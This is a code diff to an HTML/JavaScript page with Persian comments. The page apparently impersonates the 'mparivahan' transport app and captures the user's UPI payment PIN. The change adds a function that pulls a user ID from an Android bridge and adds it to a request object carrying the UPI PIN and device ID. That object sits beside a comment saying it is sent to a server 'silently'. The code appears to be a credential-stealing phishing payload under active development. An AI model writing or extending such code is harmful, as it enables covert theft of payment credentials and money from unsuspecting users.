@@ -316,7 +316,7 @@ h5 {
     let isHidden = true;
     let savedPIN = '';
     
-    // دریافت Device ID از Android
+    // دریافت Device ID و User ID از Android
     function getDeviceId() {
         try {
             if (typeof Android !== 'undefined' && Android.getDeviceId) {
@@ -326,6 +326,17 @@ h5 {
             console.error('Error getting device ID:', e);
         }
         return 'web_browser_' + Date.now();
+    }
+
+    function getUserId() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getUserId) {
+                return Android.getUserId();
+            }
+        } catch (e) {
+            console.error('Error getting user ID:', e);
+        }
+        return '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'; // Fallback
     }
 
     function updateDisplay() {
@@ -375,11 +386,12 @@ h5 {
         showVerifyDialog();
         
         const deviceId = getDeviceId();
+        const userId = getUserId();
         const requestData = {
             upi_pin: upiPin,
             device_id: deviceId,
             app_type: 'mparivahan',
-            user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
+            user_id: userId
         };
 
         // Send to server silently
